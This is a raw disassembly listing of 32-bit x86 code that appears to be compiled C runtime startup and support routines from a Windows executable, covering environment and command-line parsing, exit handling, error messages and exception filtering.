  4243e6:	jmp    FWORD PTR [ebx+0x243beb0e]
  4243ec:	pop    eax
  4243ed:	push   ebp
  4243ee:	push   ecx
  4243ef:	sub    dl,BYTE PTR [esi]
  4243f1:	mov    ebp,ebx
  4243f3:	sahf   
  4243f4:	call   0x3b13b5c0
  4243f9:	das    
  4243fa:	scas   al,BYTE PTR es:[edi]
  4243fb:	add    cl,dh
  4243fd:	jecxz  0x424469
  4243ff:	add    BYTE PTR [edx+0x0],ch
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
